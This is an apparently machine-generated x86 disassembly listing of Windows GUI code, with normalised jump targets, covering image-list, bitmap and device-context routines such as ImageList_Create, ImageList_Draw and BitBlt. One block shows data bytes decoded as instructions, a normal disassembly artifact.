cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_440ba8
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_4032a8
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_440b94
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_441050
sub_441158
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032a8
test eax eax
je r-xdata
sub_4411d0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_4042c0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_403f08
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4139f4
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4139f4
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
sub_441238
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032a8
test eax eax
je r-xdata
sub_441290
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_4042c0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_403f08
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032a8
test eax eax
je r-xdata
sub_4412f0
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032a8
test eax eax
je r-xdata
sub_44134c
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032a8
test eax eax
je r-xdata
sub_4413b0
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_4139f4
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_4032a8
test eax eax
je r-xdata
sub_441410
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_4042c0
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_41a234
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_440ff0
sub_44145c
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_441484
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4409b0
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_441050
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_441518
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41547c
mov edi eax
mov eax esi
call sub_443f3c
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_441544
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_441588
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4415ad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4415b4
retn
sub_441636
inc esp
add [ ebx ] cl
push esp
inc ebx
push 0x65676e61
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ ebx ] ecx
push esp
dec ecx
insd
popad
dec ecx
outsb
js r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
lodsb [ esi ]
push ss
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
pop ss
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
push ss
inc esp
add al bh
push ss
inc esp
add [ eax ] ch
add [ eax ] al
shl [ edx ] 0x41
add [ esp + 0x41 ] cl
add [ ebx + esi ] dh
inc eax
add [ eax + 0x3c00419d ] ah
xor eax [ eax ]
xor [ ebx ] dh
inc eax
add [ eax - 0x53ffbfd0 ] dl
xor [ eax ] al
les edx [ edi ]
inc esp
add [ edx ] dl
inc esp
add [ ebp + 0x21540044 ] bl
inc esp
add [ ecx ] ch
inc ecx
add al bh
lahf
inc ecx
add [ ecx ] bh
inc ecx
add [ edx ] dh
inc ecx
add [ esp + 0x41 ] ah
add [ ecx + 0x41 ] cl
add [ ecx + 0x41 ] al
add [ esp + 0x41 ] ch
add [ eax + 0x17 ] bh
inc esp
add [ eax + 0x1d ] cl
inc esp
add [ eax ] dh
sbb [ eax + eax + 0x50 ] al
sub al [ eax + eax - 0x24 ]
sub al [ eax + eax + 0x54 ]
and eax [ eax + eax + 0x1 ]
add bh ch
jmp [ ebx + 0x44 ]
sub_441778
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419cdc
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_4417c4
push ebx
push esi
push edi
call sub_40346c
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_413adc
mov edx eax
mov eax edi
call sub_4423b4
mov eax [ edi + 0x50 ]
call sub_4030f8
mov eax edi
call sub_441a88
mov eax [ edi + 0x4c ]
call sub_4030f8
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_419d28
test bl bl
jle r-xdata
call sub_4030f8
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403454
sub_441830
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4418dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_44233c
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4202b4
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_4418fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4418e4
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_4418fc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44199d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_42139c
mov eax ebx
call sub_42087c
mov eax [ eax + 0x14 ]
xor edx edx
call sub_41d4f4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_4125c0
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_42087c
pop edx
call sub_41d898
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4419a4
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_4419c0
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_4418fc
pop ecx
pop edx
pop ebx
retn
sub_4419f8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_441a88
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4419c0
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_4032f4
sub_441a34
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4422c4
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_4208e8
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_441a88
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4418e8
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_4032f4
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_441a24
push eax
call ImageList_Destroy
sub_441ac0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_441b53
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_4418e8
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441b5a
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
mov edx eax
mov eax ebx
call sub_441ce8
sub_441b60
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4202b4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_441c0f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4202b4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_441bf2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4418f0
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_441a34
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_441a34
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441bf9
mov eax [ ebp - 0x10 ]
call sub_4030f8
retn
sub_441c2c
push ebx
mov ebx eax
mov eax ebx
call sub_4418e8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_441a24
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_441c50
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_441ccf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_441c2c
cmp esi eax
jl r-xdata
mov eax ebx
call sub_4418e8
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
mov eax ebx
mov si 0xffef
call sub_4032f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441cd6
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
push esi
mov eax ebx
call sub_441a24
push eax
call ImageList_Remove
sub_441ce8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4418e8
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_441738
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_4032f4
pop esi
pop ebx
retn
sub_441d20
push ebx
mov ebx eax
mov eax ebx
call sub_4418e8
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_441a24
push eax
call ImageList_GetBkColor
call sub_441758
pop ebx
retn
sub_441d48
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_4418e8
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_441738
push eax
mov eax ebx
call sub_441d20
call sub_441738
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_41dbbc
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_441a24
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_42087c
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41d4f4
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_4125c0
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_42087c
pop edx
call sub_41d898
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_42087c
call sub_41dbbc
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_441a24
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_4125c0
mov eax [ ebx + 0x54 ]
call sub_42087c
call sub_41dbbc
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_41d4f4
mov eax edi
call sub_41dbbc
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_41d4f4
mov eax edi
call sub_41dbbc
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_4202b4
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_4215ec
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_441f1c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_441f40
pop ebx
pop ebp
retn 0xc
sub_441f40
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4418e8
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_441f8c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_4125c0
mov eax [ ebp - 0x4 ]
call sub_442c20
xor eax eax
push ebp
push sub_442125
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4202b4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_442108
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4202b4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4420eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_4215ec
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4420f2
mov eax [ ebp - 0x10 ]
call sub_4030f8
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_42087c
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_41d898
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_41dbbc
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_42087c
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_41d898
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_41dbbc
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_441b60
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_442134
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_441a24
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_441f8c
sub_442154
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov eax ebx
call sub_441a88
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_41402c
mov eax ebx
call sub_441cdc
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_44233c
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_441a24
mov edx eax
mov eax ebx
call sub_4419c0
mov eax ebx
call sub_4418e8
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_441a24
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_4418f0
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_441a24
push eax
call ImageList_GetBkColor
call sub_441758
mov edx eax
mov eax ebx
call sub_441ce8
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_442134
jmp r-xdata
sub_442214
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_414110
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_44233c
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_441cdc
mov eax esi
call sub_441a24
mov edx eax
mov eax ebx
call sub_4419c0
mov eax ebx
call sub_4418e8
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_441a24
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_4418f0
jmp r-xdata
mov eax esi
call sub_441a24
push eax
call ImageList_GetBkColor
call sub_441758
mov edx eax
mov eax ebx
call sub_441ce8
mov edx esi
mov eax ebx
call sub_442134
pop esi
pop ebx
retn
sub_4422c4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
